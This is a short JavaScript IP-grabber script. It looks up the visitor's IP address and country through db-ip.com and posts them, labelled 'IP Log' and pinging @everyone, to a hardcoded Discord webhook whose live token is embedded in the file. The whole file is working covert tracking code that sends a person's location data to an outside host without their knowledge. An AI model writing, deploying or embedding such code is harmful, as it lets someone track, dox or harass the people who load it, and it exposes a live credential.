var webHookUrl = "https://discord.com/api/webhooks/1014868177039151124/T3a7hwXi2nn28WYaQa8MjrnWbvCkq_-E-ZOmH1tcqSZhMPX4bBc-7BZVC-ZjW30_kOss";

$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
  console.log(JSON.stringify(data, null, 2));
});

const request = async () => { // Calling a "synchronous" fetch
    const response = await fetch('https://api.db-ip.com/v2/free/self');
    const data = await response.json();
    console.log(data);

    // Declaring variables
    var ip = data.ipAddress;
    var country = data.countryName;

    // Open POST Request
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username:   "IP Log",
        avatar_url: "https://cdn.discordapp.com/attachments/1014868074660368466/1014868966793023548/doge_hut.jpg",
        content:    "**Masz bombe w neta ** @everyone \n" + 
		    "__**:globe_with_meridians: IP Address:**__ \n" +
                    "`" + ip + "` \n \n" +
		    "__**Country:**__ \n" +
		    "`" + country + "`"
    }

    postRequest.send(JSON.stringify(params));

}

request();
